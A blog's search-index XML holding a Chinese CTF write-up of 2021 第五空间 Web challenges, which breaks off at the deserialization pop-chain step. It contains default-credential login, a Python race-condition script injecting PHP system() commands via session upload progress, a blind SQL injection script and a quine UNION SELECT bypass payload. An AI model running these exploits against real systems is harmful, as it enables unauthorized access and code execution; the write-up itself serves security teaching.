<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>第五空间2021 Web题解</title>
    <url>/2022/01/15/5space/</url>
    <content><![CDATA[<h1 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h1><p><img src="https://img-blog.csdnimg.cn/1a52907a32aa4567b09082435583d7b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目是一个网站管理工具WebFTP2011，上网搜索WebFTP，可以在github中找到这个项目，从README中获取初始用户名和密码</p>
<blockquote>
<p>使用说明 1、初始账号 超级管理员 admin 密码 admin888<br><img src="https://img-blog.csdnimg.cn/ecaf0e5e25974e81b730b64bf5f38d4f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
</blockquote>
<p>成功登陆后寻找服务器的网站目录，随便翻看有无可疑文件，最后在phpinfo中找到flag<br><img src="https://img-blog.csdnimg.cn/a24a801c0f7746a3b3be812a59b6b05f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h1><p>题目给出index源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>session包含思路</strong><br>由源代码可知，攻击点共有两个，一个是变量shell的rce，一个是file的文件包含，由于shell变量需要经过<code>filter($shell) | checkNums($shell)</code>，限制太多，想要rce几乎无从下手，于是我们考虑从file寻找攻击点<br>首先访问<code>/?mode=eval</code>后可以看到phpinfo的内容<br><img src="https://img-blog.csdnimg.cn/50d042dc45f748e2877b331d982e64ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>session.save_handler &#x3D; files 表示session是以文件形式存储的<br>session.save_path &#x3D;&#x2F;tmp 表示session文件的存储目录在&#x2F;tmp下<br>session.auto_start &#x3D; off 表示默认不开启session</p>
</blockquote>
<p>通常要进行session包含必须使用到函数<code>session_start();</code>而在本题中确没有这个函数，无法存储session文件，但本题可以利用session.upload_progress进行文件包含</p>
<blockquote>
<p>session.upload_progress.enabled &#x3D; on 表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中<br>session.upload_progress.cleanup &#x3D; on 表示当文件上传结束后，php将会立即清空对应session文件中的内容（想要包含session需要利用条件竞争）<br>session.upload_progress.name 表示当<code>PHP_SESSION_UPLOAD_PROGRESS</code>出现在表单中，php将会报告上传进度，最大的好处是，它的值可控<br>session.use_strict_mode &#x3D; off 这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
</blockquote>
<p>当我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。我们就可以采用自定义cookie的方法来存储session文件，并用session.upload_progress.name来控制文件的内容，然后再进行文件包含，实现rce</p>
<p><strong>脚本实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">myurl = <span class="string">&#x27;http://1.14.71.254:28001/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;h2tg&#x27;</span></span><br><span class="line">writedata = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">flag = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat /nssctfasdasdflag&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeshell</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#resp = requests.post(url=myurl, data=writedata, files=&#123;&#x27;file&#x27;: (&#x27;1.txt&#x27;, 123)&#125;, cookies=mycookie)</span></span><br><span class="line">        resp = requests.post(url=myurl, data=flag, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.txt&#x27;</span>, <span class="number">123</span>)&#125;, cookies=mycookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload_url = myurl + <span class="string">&#x27;?file=&#x27;</span> + <span class="string">&#x27;/tmp/sess_&#x27;</span> +sessid</span><br><span class="line">        resp = requests.get(url=payload_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;upload_progress&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    writeshell = threading.Thread(target=writeshell, args=(session,))</span><br><span class="line">    writeshell.daemon = <span class="literal">True</span></span><br><span class="line">    writeshell.start()</span><br><span class="line">    getshell(session)</span><br></pre></td></tr></table></figure>
<p>在<code>writeshell</code>函数中保持上传文件，data的变量名要为<code>PHP_SESSION_UPLOAD_PROGRESS</code>，值为要执行的命令，上传的文件可以为任意文件，cookie要设置<code>PHPSESSID</code>为自定义的id<br>并在<code>getshell</code>函数中利用条件竞争去包含session文件，如果成功就把返回的html打印出来<br><img src="https://img-blog.csdnimg.cn/45e03d8e7e034893965e7fbb0a4b0f47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/550b7657614449f6a9607a7852f17372.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h1><p><img src="https://img-blog.csdnimg.cn/2793918c0acf45dc862a8dd3b79745a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目是一个简单的登录系统，在注释中可以找到提示<br>访问<code>/?source</code>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;/index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;账号&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;密码&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> / value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
<p>尽管checkSql对$password的限制非常多，但还是可以对$password变量实现时间盲注，得到数据库名为CTF</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://1.14.71.254:28090/index.php&#x27;</span></span><br><span class="line">str_range=<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">123</span>)</span><br><span class="line">success=<span class="string">&#x27;something&#x27;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_range:</span><br><span class="line">        payload=<span class="string">&quot;&#x27;/**/or/**/strcmp(mid(database(),%d,1),&#x27;%c&#x27;)#&quot;</span>%(n,<span class="built_in">chr</span>(i))</span><br><span class="line">        login=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:payload&#125;</span><br><span class="line">        r=requests.post(url,data=login)</span><br><span class="line">        txt=r.text</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="built_in">str</span>+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#CTF</span></span><br></pre></td></tr></table></figure>
<p>但进一步的注入会发现表都是空的，那就必须要构造出满足条件的payload，即<code>($row[&#39;password&#39;] === $password)</code><br>以下为参考别人的文章进行payload构造</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>

<p><strong>第一次构造</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select/**/replace(replace(<span class="string">&#x27;.&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| replace(replace(<span class="string">&#x27;.&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;.&#x27;</span>) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| .                                                    |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">使用replace函数，该语句会返回点号</span><br><span class="line">但我们需要返回的是和查询语句一模一样的语句，故我们可以用语句本身来替换点号</span><br></pre></td></tr></table></figure>


<p><strong>第二次构造</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">第一次构造的sql语句</span><br><span class="line">select/**/replace(replace(<span class="string">&#x27;.&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">将上述语句中的点号替换为以下语句</span><br><span class="line">replace(replace(<span class="string">&quot;.&quot;</span>,char(34),char(39)),char(46),<span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">mysql&gt; select/**/replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><strong>第三次构造</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">我们的payload形式应该为(最后有一个井号)</span><br><span class="line">&#x27;/**/union/**/select/**/xxxxxx</span><br><span class="line"></span><br><span class="line">初次构造的payload</span><br><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)#</span><br><span class="line"></span><br><span class="line">将上述语句中的点号替换为以下语句</span><br><span class="line">&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br><span class="line"></span><br><span class="line">最终payload</span><br><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select/**/replace(replace(<span class="string">&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>);</span><br><span class="line">+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(<span class="string">&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>,char(34),char(39)),char(46),<span class="string">&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>)                          |</span><br><span class="line">+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| <span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="string">&quot;/**/union/**/select/**/replace(replace(&quot;</span>.<span class="string">&quot;,char(34),char(39)),char(46),&quot;</span>.<span class="string">&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;</span>/**/union/**/select/**/replace(replace(<span class="string">&quot;.&quot;</span>,char(34),char(39)),char(46),<span class="string">&quot;.&quot;</span>)<span class="comment">#&#x27;)# |</span></span><br><span class="line">+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>在mysql中执行可以看到输出的值和我们的payload完全一致，即<code>($row[&#39;password&#39;] === $password)</code><br>传参后得到flag</p>
<h1 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h1><p>题目给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造pop链</p>
